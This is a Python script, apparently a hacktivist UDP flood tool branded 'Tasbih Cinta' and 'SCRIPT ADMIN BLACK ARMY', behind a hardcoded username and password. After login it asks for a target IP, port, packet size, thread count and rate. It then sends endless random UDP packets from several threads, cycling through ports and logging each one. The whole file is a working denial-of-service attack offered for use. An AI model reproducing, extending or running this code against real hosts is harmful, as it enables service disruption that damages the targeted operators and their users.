#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import time
import socket
import logging
import random
import threading
from datetime import datetime
from django.core.validators import validate_ipv46_address
from django.core.exceptions import ValidationError

# Clearing the SCREEN
class colors:
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    LIGHT_GRAY = '\033[37m'
    DARK_GRAY = '\033[90m'
    LIGHT_RED = '\033[91m'
    LIGHT_GREEN = '\033[92m'
    LIGHT_YELLOW = '\033[93m'
    LIGHT_BLUE = '\033[94m'
    LIGHT_MAGENTA = '\033[95m'
    LIGHT_CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    ITALIC = '\033[3m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    REVERSE = '\033[7m'
    HIDDEN = '\033[8m'
    STRIKETHROUGH = '\033[9m'
    DOUBLE_UNDERLINE = '\033[21m'
    NORMAL_COLOR = '\033[22m'
    NORMAL_INTENSITY = '\033[22m'
    RESET_UNDERLINE = '\033[24m'
    RESET_BLINK = '\033[25m'
    RESET_REVERSE = '\033[27m'
    RESET_HIDDEN = '\033[28m'
    RESET_STRIKETHROUGH = '\033[29m'
    ORANGE = '\033[38;5;214m'  # Light Orange
    PURPLE = '\033[38;5;141m'  # Light Purple
    TEAL = '\033[38;5;37m'     # Teal
    PINK = '\033[38;5;206m'    # Light Pink
    LIME = '\033[38;5;154m'    # Lime Green
    CYAN_BLUE = '\033[38;5;39m'  # Cyan Blue
    DARK_GREEN = '\033[38;5;22m'  # Dark Green
    SKY_BLUE = '\033[38;5;111m'  # Sky Blue
    DARK_ORANGE = '\033[38;5;166m'  # Dark Orange
    INDIGO = '\033[38;5;57m'   # Indigo
    GRAY = '\033[38;5;242m'   
    MAROON = '\033[38;5;52m'   
    OCEAN_BLUE = '\033[38;5;21m'  
    GOLD = '\033[38;5;220m' 

LOG_FILE = "attack_log.txt"

# Logger
def log_message(message: str):
    with open(LOG_FILE, "a") as log_file:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_file.write(f"[{timestamp}] {message}\n")
    print(message)

os.system("clear")
os.system("\033[104m \033[33mhttps://github.com/ahmadsan272-ship-it/TasbihCinta\033[0m")
print("\033[100m \033[31mWelcome to zona TASBIH CINTA\033[0m")
time.sleep(5)
print("Loading.......")

attemps = 0
os.system("clear")
print("""
                                                                                                                                                                                                               
\033[31m╔═══\033[36m███████╗\033[31m═══\033[33m██╗\033[31m══ \033[97m█████╗ \033[91m█████╗\033[31m═════\033[38;5;206m█╗\033[31m═══\033[38;5;206m█╗\033[31m═════════════════════╗\033[0m
\033[31m║\033[100m      \033[36m█╔══╝  \033[33m█╔═█╗  \033[97m█╔═══╝ \033[91m█╔═══█║    \033[38;5;206m█║   █║\033[100m                     \033[31m║
\033[31m║\033[100m      \033[36m█║    \033[33m█║   █║ \033[97m█║     \033[91m█║   █║    \033[38;5;206m█║   █║\033[100m                     \033[31m║
\033[31m║\033[100m      \033[36m█║    \033[33m█║   █║ \033[97m█████╗ \033[91m█████╗  \033[34m█╗ \033[38;5;206m██████║\033[100m                     \033[31m║
\033[31m║\033[100m      \033[36m█║    \033[33m██████║     \033[97m█║ \033[91m█║   █║ \033[34m█║ \033[38;5;206m█║   █║\033[100m                     \033[31m║
\033[31m║\033[100m      \033[36m█║    \033[33m█╔═══█║ \033[97m█████║ \033[91m█████║  \033[34m█║ \033[38;5;206m█║   █║\033[100m                     \033[31m║
\033[31m║\033[100m      \033[36m═╝    \033[33m═╝   ═╝ \033[97m═════╝ \033[91m═════╝  \033[34m█║ \033[38;5;206m═╝   ═╝\033[100m                     \033[31m║
\033[31m║\033[100m                             \033[34m████╗ █║ ██╗    █╗ ███████╗ ██╗\033[100m      \033[31m║
\033[31m║\033[100m                            \033[34m█╔═══╝ █║ █ █║   █║    █║   █╔═█╗\033[100m     \033[31m║
\033[31m║\033[100m                           \033[34m█║      █║ █║ █║  █║    █║  █║   █║\033[100m    \033[31m║
\033[22m║\033[100m                           \033[34m█║      ═╝ █║  █║ █║    █║  █║   █║\033[100m    \033[31m║
\033[31m║\033[100m                            \033[34m█║        █║   █ █║    █║  ██████║\033[100m    \033[31m║
\033[31m╚═════════════════════════════\033[34m████║\033[31m════\033[34m█║\033[31m════\033[34m██║\033[31m════\033[34m█║\033[31m══\033[34m█╔═══█║\033[31m════╝\033[0m")
                               \033[34m═══╝    ═╝    ══╝    ═╝  ═╝   ═╝""")
print(f"\033[37m╔{'═' * 66}╗")
print(f"\033[37m║\033[0m \033[41m{' ' * 20} SCRIPT ADMIN BLACK ARMY {' ' * 19}\033[0m \033[37m║")
print(f"\033[37m║\033[0m \033[41m  Designt By: KunFay'99{' ' * 41}\033[0m \033[37m║")
print(f"\033[37m╚{'═' * 66}╝")
while attemps < 100:
    username = input("\033[100m \033[32mEnter your username: \033[33m \033[0m")
    password = input("\033[100m \033[31mEnter your password: \033[33m \033[0m")

    if username == 'tc4teen' and password == 'tc4teen':
        print("\033[104m \033[32m DEDICATED TO THE PALESTINE STRUGGLE \033[0m")
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue
        
# Validate target IP
def validate_ip(ip: str):
    try:
        validate_ipv46_address(ip)
        return True
    except ValidationError:
        return False

# Attack function
def attack(ip: str, port: int, packet_size: int, rate_limit: float):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(packet_size)
    sent = 0
    try:
        while True:
            sock.sendto(data, (ip, port))
            sent += 1
            log_message(f"\033[100m \033[32mTasbih-Cinta {threading.get_ident()}\033[103m \033[33mSent{sent}\033[0m\033[38;5;154m {ip}:{port}\033[0m")
            port = port + 1 if port < 65534 else 1
            time.sleep(rate_limit)
    except KeyboardInterrupt:
        log_message("Attack interrupted by user.")
    except Exception as e:
        log_message(f"Error in thread {threading.get_ident()}: {e}")
    finally:
        sock.close()

# Main script execution
def main():
    os.system("clear")
    print("""
    \033[31m╔═══\033[36m███████╗\033[31m═══\033[33m██╗\033[31m══ \033[97m█████╗ \033[91m█████╗\033[31m═════\033[38;5;206m█╗\033[31m═══\033[38;5;206m█╗\033[31m═════════════════════╗\033[0m
    \033[31m║\033[100m      \033[36m█╔══╝  \033[33m█╔═█╗  \033[97m█╔═══╝ \033[91m█╔═══█║    \033[38;5;206m█║   █║\033[100m                     \033[31m║
    \033[31m║\033[100m      \033[36m█║    \033[33m█║   █║ \033[97m█║     \033[91m█║   █║    \033[38;5;206m█║   █║\033[100m                     \033[31m║
    \033[31m║\033[100m      \033[36m█║    \033[33m█║   █║ \033[97m█████╗ \033[91m█████╗  \033[34m█╗ \033[38;5;206m██████║\033[100m                     \033[31m║
    \033[31m║\033[100m      \033[36m█║    \033[33m██████║     \033[97m█║ \033[91m█║   █║ \033[34m█║ \033[38;5;206m█║   █║\033[100m                     \033[31m║
    \033[31m║\033[100m      \033[36m█║    \033[33m█╔═══█║ \033[97m█████║ \033[91m█████║  \033[34m█║ \033[38;5;206m█║   █║\033[100m                     \033[31m║
    \033[31m║\033[100m      \033[36m═╝    \033[33m═╝   ═╝ \033[97m═════╝ \033[91m═════╝  \033[34m█║ \033[38;5;206m═╝   ═╝\033[100m                     \033[31m║
    \033[31m║\033[100m                             \033[34m████╗ █║ ██╗    █╗ ███████╗ ██╗\033[100m      \033[31m║
    \033[31m║\033[100m                            \033[34m█╔═══╝ █║ █ █║   █║    █║   █╔═█╗\033[100m     \033[31m║
    \033[31m║\033[100m                           \033[34m█║      █║ █║ █║  █║    █║  █║   █║\033[100m    \033[31m║
    \033[22m║\033[100m                           \033[34m█║      ═╝ █║  █║ █║    █║  █║   █║\033[100m    \033[31m║
    \033[31m║\033[100m                            \033[34m█║        █║   █ █║    █║  ██████║\033[100m    \033[31m║
    \033[31m╚═════════════════════════════\033[34m████║\033[31m════\033[34m█║\033[31m════\033[34m██║\033[31m════\033[34m█║\033[31m══\033[34m█╔═══█║\033[31m════╝\033[0m")
                               \033[34m═══╝    ═╝    ══╝    ═╝  ═╝   ═╝""")
    print(f"\033[37m╔{'═' * 66}╗")
    print(f"\033[37m║\033[0m \033[41m{' ' * 20} SCRIPT ADMIN BLACK ARMY {' ' * 19}\033[0m \033[37m║")
    print(f"\033[37m║\033[0m \033[41m  Designt By: KunFay'99{' ' * 41}\033[0m \033[37m║")
    print(f"\033[37m╚{'═' * 66}╝")
    ip = input(" [+] Enter Target IP: ").strip()
    if not validate_ip(ip):
        log_message("Invalid IP address provided. Exiting...")
        sys.exit(1)

    try:
        port = int(input(" [+] Enter Starting Port Number (80): ").strip() or 80)
        packet_size = int(input(" [+] Enter Packet Size (1490 bytes): ").strip() or 1490)
        threads = int(input(" [+] Enter Number of Threads (4): ").strip() or 4)
        rate_limit = float(input(" [+] Enter Rate Limit (seconds, 0.01): ").strip() or 0.01)
    except ValueError:
        log_message("Invalid input provided. Exiting...")
        sys.exit(1)

    os.system("clear")
    print("")
    log_message(f"Starting attack on {ip}:{port} with {threads} threads.")
    print(" [+] Press Ctrl+C to stop the attack.")

    thread_list = []
    for _ in range(threads):
        thread = threading.Thread(target=attack, args=(ip, port, packet_size, rate_limit))
        thread.daemon = True
        thread.start()
        thread_list.append(thread)

    try:
        for thread in thread_list:
            thread.join()
    except KeyboardInterrupt:
        log_message("Attack complite.")

if __name__ == "__main__":
    main()
